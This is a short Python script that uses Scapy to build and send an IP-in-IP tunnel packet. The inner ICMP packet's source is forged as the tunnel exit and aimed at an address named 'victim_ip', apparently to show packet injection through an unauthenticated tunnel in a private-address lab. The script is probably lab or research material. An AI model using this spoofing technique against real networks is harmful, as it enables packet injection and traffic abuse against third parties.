from scapy.layers.inet import *
from scapy.layers.inet6 import *
from scapy.packet import ls
from scapy.sendrecv import *


def construct_icmp_packet(src_ip, dst_ip):
    packet = IP(dst=dst_ip, src=src_ip)/ICMP()
    return packet

def construct_ipip_packet(src_ip, dst_ip, inner_packet):
    packet = IP(dst=dst_ip, src=src_ip)/inner_packet
    return packet





if __name__ == '__main__':
    src_ip = '192.168.1.2'
    dst_ip = '192.168.2.2'
    tunnel_exit = '192.168.10.2'
    victim_ip = '192.168.10.3'
    inner_packet = construct_icmp_packet(tunnel_exit,victim_ip)
    tunnel_packet = construct_ipip_packet(src_ip,dst_ip, inner_packet)
    tunnel_packet.display()
    send(tunnel_packet)